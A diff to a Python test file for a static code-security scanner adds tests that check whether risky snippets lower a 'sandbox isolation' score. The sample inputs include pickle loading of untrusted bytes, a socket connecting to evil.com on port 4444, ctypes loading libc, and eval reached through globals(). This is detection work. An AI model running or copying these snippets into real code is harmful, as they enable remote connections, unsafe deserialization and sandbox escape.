@@ -147,7 +147,7 @@ logging.info(f"Using api_key: {api_key}")
         assert "top_issues" in result
         assert "summary" in result
         assert "scan_mode" in result
-        assert result["scan_mode"] == "static_rules"
+        assert result["scan_mode"] in ("static_rules", "static_rules+bandit")
         assert len(result["dimensions"]) == 6
         assert 0 <= result["health_score"] <= 100
 
@@ -159,6 +159,58 @@ logging.info(f"Using api_key: {api_key}")
 '''
         result = static_scan(code)
         assert result["health_score"] >= 90
+
+    def test_pickle_deserialization(self):
+        """检测 pickle 反序列化攻击面"""
+        code = '''
+import pickle
+data = pickle.load(open("model.pkl", "rb"))
+obj = pickle.loads(untrusted_bytes)
+'''
+        result = static_scan(code)
+        sandbox_dim = next(
+            d for d in result["dimensions"] if d["name"] == "沙箱隔离"
+        )
+        assert sandbox_dim["score"] < 80
+        assert len(sandbox_dim["findings"]) >= 2
+
+    def test_raw_socket_usage(self):
+        """检测直接 socket 网络连接"""
+        code = '''
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("evil.com", 4444))
+'''
+        result = static_scan(code)
+        sandbox_dim = next(
+            d for d in result["dimensions"] if d["name"] == "沙箱隔离"
+        )
+        assert sandbox_dim["score"] < 100
+
+    def test_ctypes_sandbox_escape(self):
+        """检测 ctypes 可能的沙箱逃逸"""
+        code = '''
+import ctypes
+libc = ctypes.CDLL("libc.so.6")
+'''
+        result = static_scan(code)
+        sandbox_dim = next(
+            d for d in result["dimensions"] if d["name"] == "沙箱隔离"
+        )
+        assert sandbox_dim["score"] < 100
+        assert any("ctypes" in f for f in sandbox_dim["findings"])
+
+    def test_globals_introspection(self):
+        """检测 globals() 内省调用"""
+        code = '''
+g = globals()
+g["__builtins__"]["eval"]("malicious_code")
+'''
+        result = static_scan(code)
+        sandbox_dim = next(
+            d for d in result["dimensions"] if d["name"] == "沙箱隔离"
+        )
+        assert sandbox_dim["score"] < 100
 
 
 # ═══════════════════════════════════════════════════════════
